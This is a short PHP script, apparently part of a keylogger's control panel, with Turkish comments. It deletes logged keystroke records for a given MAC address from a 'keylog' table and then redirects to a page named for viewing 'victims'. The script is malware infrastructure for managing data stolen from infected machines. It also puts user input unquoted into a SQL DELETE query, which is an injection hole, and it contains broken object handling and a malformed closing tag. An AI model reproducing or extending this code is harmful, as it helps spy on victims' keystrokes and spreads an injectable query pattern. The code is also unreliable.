<?php

  include("header.php");
ob_start();

					
					
	  
?>
<?php
		
			$cekilen_id=htmlspecialchars(strip_tags($_POST['id']));
			
			include("vt.php");
			$db = $db->query("SELECT * FROM keylog order by id asc"); //asc ile id ye göre artan şekilde sıralıyoruz desc yapsaydık sondan başlardı..
  
  

				  $oku = $db->fetchAll(PDO::FETCH_ASSOC); //verilerin hepsi eğer birini alacaksak sadece fetch olacaktı
				  foreach ($oku as $row) {
				  extract($row);
				  if($macadres==$cekilen_id){
				 
				 $sil =$db->exec("DELETE FROM keylog WHERE macadres=$cekilen_id");		//verimizi veritabanından siliyoruz
				  }}
					
					
					
					
					
					
					
					header("Location:kurbanlarizle.php?id=".$cekilen_id);
		
		
		?>
		<?php}ob_end_flush();?>